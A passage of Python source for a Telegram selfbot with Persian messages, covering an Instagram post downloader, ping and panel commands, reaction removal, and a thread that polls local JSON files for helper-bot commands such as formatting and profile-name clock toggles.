                error_msg = data.get("status", "خطای نامشخص")
                await loading_msg.edit(f"❌ **خطا از سمت API**\n{error_msg}")
                return
            if "result" not in data:
                await loading_msg.edit("❌ **پاسخ نامعتبر از سرور**\nفیلد 'result' یافت نشد")
                return
            
            result = data.get("result", {})
            
            if result.get("status") != "success":
                error_detail = result.get("message", "پست یافت نشد")
                await loading_msg.edit(f"❌ **خطا:** {error_detail}")
                return
            posts = result.get("result", [])
            
            if not posts:
                await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
                return
            post = posts[0]
            post_id = post.get('id', 'نامشخص')
            username = post.get('username', 'نامشخص')
            caption = post.get('caption', 'بدون توضیح')
            is_video = post.get('is_video', False)
            thumbnail_url = post.get('video_img', '')
            caption_text = f"""
📸 **اینستاگرام دانلودر**

👤 **صاحب پست:** @{username}
🆔 **آیدی پست:** `{post_id}`

📝 **توضیحات:**
{caption[:500]}{'...' if len(caption) > 500 else ''}

#دانلود_اینستاگرام
"""
            thumbnail_path = None
            if thumbnail_url:
                try:
                    thumb_response = requests.get(thumbnail_url, timeout=15)
                    if thumb_response.status_code == 200:
                        thumbnail_path = f"temp_thumb_{post_id}.jpg"
                        with open(thumbnail_path, 'wb') as f:
                            f.write(thumb_response.content)
                except:
                    thumbnail_path = None
            if is_video:
                video_url = post.get('video_url')
                
                if not video_url:
                    await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
                    if thumbnail_path and os.path.exists(thumbnail_path):
                        os.remove(thumbnail_path)
                    return                
                await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")                
                try:
                    video_response = requests.get(video_url, timeout=60)
                    
                    if video_response.status_code != 200:
                        await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        return
                    temp_file = f"temp_insta_{post_id}.mp4"
                    with open(temp_file, 'wb') as f:
                        f.write(video_response.content)
                    file_size = os.path.getsize(temp_file)
                    if file_size == 0:
                        await loading_msg.edit("❌ **فایل ویدیو خالی است**")
                        os.remove(temp_file)
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        return                    
                    await loading_msg.edit("📤 **در حال آپلود ویدیو...**")                    
                    try:
                        await client.send_video(
                            chat_id=message.chat.id,
                            video=temp_file,
                            caption=caption_text,
                            thumb=thumbnail_path if thumbnail_path else None,
                            supports_streaming=True,
                            reply_to_message_id=message.id
                        )
                    except Exception as upload_error:
                        await loading_msg.edit(f"❌ **خطا در آپلود:**\n`{str(upload_error)[:100]}`")
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    if thumbnail_path and os.path.exists(thumbnail_path):
                        os.remove(thumbnail_path)
                    
                    await loading_msg.delete()
                    
                except Exception as e:
                    await loading_msg.edit(f"❌ **خطا در پردازش ویدیو:**\n`{str(e)[:100]}`")
                    for temp_file in [f"temp_insta_{post_id}.mp4", f"temp_thumb_{post_id}.jpg"]:
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
            else:
                media_url = thumbnail_url
                
                if not media_url:
                    await loading_msg.edit("❌ **لینک عکس یافت نشد**")
                    return                
                await loading_msg.edit("🖼️ **در حال دانلود عکس...**")                
                try:
                    image_response = requests.get(media_url, timeout=30)
                    
                    if image_response.status_code != 200:
                        await loading_msg.edit("❌ **خطا در دانلود عکس**")
                        return
                    temp_file = f"temp_insta_{post_id}.jpg"
                    with open(temp_file, 'wb') as f:
                        f.write(image_response.content)                    
                    await loading_msg.edit("📤 **در حال آپلود عکس...**")                    
                    try:
                        await client.send_photo(
                            chat_id=message.chat.id,
                            photo=temp_file,
                            caption=caption_text,
                            reply_to_message_id=message.id
                        )
                    except Exception as upload_error:
                        await loading_msg.edit(f"❌ **خطا در آپلود عکس:**\n`{str(upload_error)[:100]}`")
                    if os.path.exists(temp_file):
                        os.remove(temp_file)                    
                    await loading_msg.delete()                    
                except Exception as e:
                    await loading_msg.edit(f"❌ **خطا در پردازش عکس:**\n`{str(e)[:100]}`")
                    if os.path.exists(f"temp_insta_{post_id}.jpg"):
                        os.remove(f"temp_insta_{post_id}.jpg")                    
        except requests.exceptions.Timeout:
            await loading_msg.edit("❌ **اتصال timeout شد**\nسرور پاسخ نداد.")
        except requests.exceptions.ConnectionError:
            await loading_msg.edit("❌ **خطا در اتصال**\nاینترنت خود را بررسی کنید.")
        except Exception as e:
            await loading_msg.edit(f"❌ **خطای غیرمنتظره:**\n`{str(e)[:150]}`")
            
    except Exception as e:
        await message.edit(f"❌ **خطای کلی:**\n`{str(e)[:150]}`")

@app.on_message(filters.me & filters.command("پینگ", prefixes=""))
async def ping_command(client: Client, message: Message):
    start_time = datetime.now()
    ping_msg = await message.edit("**⏳ در حال بررسی...**")
    end_time = datetime.now()
    
    ping_time = (end_time - start_time).microseconds / 1000
    await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")
@app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
async def panel_command(client, message: Message):
        results = await client.get_inline_bot_results(bot_username, "panel")
        
        if results and results.results:
            sent_message = await client.send_inline_bot_result(
                chat_id=message.chat.id,
                query_id=results.query_id,
                result_id=results.results[0].id
            )
            await message.delete()
            
        else:
            await message.reply_text("❌ پنل یافت نشد")
            await asyncio.sleep(3)
            await message.delete()
@app.on_message(filters.me & filters.regex(r'^حذف ریکت$'))
async def remove_reaction_command(client, message):
    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
        
        if str(user_id) in auto_reactions:
            del auto_reactions[str(user_id)]
            save_reactions()
            await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
        else:
            await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
    else:
        await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید**")

def check_commands_from_helper():
    while True:
        try:
            import glob
            command_files = glob.glob("selfbot_commands_*.json")
            
            for command_file in command_files:
                try:
                    user_id_str = command_file.replace("selfbot_commands_", "").replace(".json", "")
                    if user_id_str.isdigit():
                        user_id = int(user_id_str)
                    else:
                        continue
                    if USER_ID and user_id != USER_ID:
                        continue
                    
                    with open(command_file, 'r', encoding='utf-8') as f:
                        content = f.read().strip()
                        if not content:
                            data = {'pending': False, 'command': '', 'user_id': 0, 'timestamp': 0}
                        else:
                            data = json.loads(content)
                    
                    if data.get('pending', False):
                        command = data.get('command', '')
                        
                        print(f"📨 دریافت دستور از هلپر برای کاربر {user_id}: {command}")
                        
                        asyncio.run_coroutine_threadsafe(
                            execute_command_from_helper(command, user_id),
                            app.loop
                        )
                        
                        data['pending'] = False
                        with open(command_file, 'w', encoding='utf-8') as f:
                            json.dump(data, f, ensure_ascii=False, indent=4)
                            
                except Exception as e:
                    print(f"❌ خطا در پردازش فایل {command_file}: {e}")
                    
            time.sleep(1)
            
        except json.JSONDecodeError:
            print("❌ فایل commands.json خراب است، بازنویسی می‌شود...")
            time.sleep(2)
        except Exception as e:
            print(f"❌ خطا در بررسی دستورات هلپر: {e}")
            time.sleep(5)

async def execute_command_from_helper(command, user_id):
    try:
        print(f"🔵 اجرای دستور: '{command}' برای کاربر {user_id}")

        if command == "ریست فرمت":
            for key in format_settings:
                format_settings[key] = False

            result_file = f"reaction_result_{user_id}.json"
            with open(result_file, 'w', encoding='utf-8') as f:
                json.dump({
                    'result': "✅ همه فرمت‌ها ریست شدند",
                    'timestamp': time.time()
                }, f, ensure_ascii=False, indent=4)

            print(f"✅ نتیجه در {result_file} ذخیره شد")
            return
        
        if command.startswith("فرمت "):
            parts = command.split()
            if len(parts) == 3:
                format_name = parts[1]
                action = parts[2]
                
                print(f"🔍 پردازش فرمت: نام='{format_name}', action='{action}'")
                
                name_mapping = {
                    "بولد": "بولد",
                    "ایتالیک": "ایتالیک",
                    "زیرخط": "زیرخط",
                    "خط‌خورده": "خط خورده",
                    "اسپویلر": "اسپویلر",
                    "کد": "کد",
                    "پیش‌فرمت": "پیش‌فرمت",
                    "نقل‌قول": "نقل‌قول",
                }
                
                correct_name = name_mapping.get(format_name, format_name)
                if correct_name in format_settings:
                    format_settings[correct_name] = (action == "روشن")
                    result_file = f"reaction_result_{user_id}.json"
                    with open(result_file, 'w', encoding='utf-8') as f:
                        json.dump({
                            'result': f"✅ فرمت {correct_name} {'فعال' if action == 'روشن' else 'غیرفعال'} شد",
                            'timestamp': time.time()
                        }, f, ensure_ascii=False, indent=4)
                else:
                    print(f"❌ فرمت '{correct_name}' یافت نشد!")
            return
        
        if command == "فرمت وضعیت":
            status_text = "📊 **وضعیت فرمت‌ها:**\n\n"
            for format_name, is_active in format_settings.items():
                emoji = "🟢" if is_active else "🔴"
                status_text += f"{emoji} **{format_name}**: {'فعال' if is_active else 'غیرفعال'}\n"
            
            result_file = f"reaction_result_{user_id}.json"
            with open(result_file, 'w', encoding='utf-8') as f:
                json.dump({
                    'result': status_text,
                    'timestamp': time.time()
                }, f, ensure_ascii=False, indent=4)
            return
        
        if command == "تایم روشن":
            global user_time_status, time_updater_started
            user_time_status[user_id] = True
            user_original_names.setdefault(user_id, (await app.get_me()).first_name or "کاربر")
            
            if not time_updater_started:
                time_updater_started = True
                asyncio.create_task(continuous_time_updater(app))
            
            await update_name_with_time(user_id, app)
            print(f"✅ تایم روشن شد برای کاربر {user_id}")
            return
            
        if command == "تایم خاموش":
            user_time_status[user_id] = False
            if user_id in user_original_names:
                await app.update_profile(first_name=user_original_names[user_id])
            print(f"✅ تایم خاموش شد برای کاربر {user_id}")
            return
           
        if command.startswith("تنظیم فونت "):
            font_num = int(command.split()[-1])
            if 1 <= font_num <= 15:
                user_fonts["me"] = font_num
                if user_time_status.get(user_id, False):
                    await update_name_with_time(user_id, app)
                print(f"✅ فونت به شماره {font_num} تغییر کرد")
                
                try:
                    settings_file = f"settings_{user_id}.json"
                    if os.path.exists(settings_file):
                        with open(settings_file, 'r', encoding='utf-8') as f:
                            settings = json.load(f)
                        settings['font'] = font_num
                        with open(settings_file, 'w', encoding='utf-8') as f:
                            json.dump(settings, f, ensure_ascii=False, indent=4)
                except:
                    pass
            return
                
    except Exception as e:
        print(f"❌ خطا در اجرای دستور {command}: {e}")
        import traceback
        traceback.print_exc()

command_checker_thread = threading.Thread(target=check_commands_from_helper, daemon=True)
command_checker_thread.start()

if __name__ == "__main__":
    if USER_ID:
        print(f"✅ سلف‌بات برای کاربر {USER_ID} در حال اجرا...")
        print(f"📱 شماره: {PHONE}")
    else:
        print("⚠️ سلف‌بات در حالت معمولی اجرا شد")
    
    threading.Thread(target=start_pishi_system, daemon=True).start()
    
    app.run()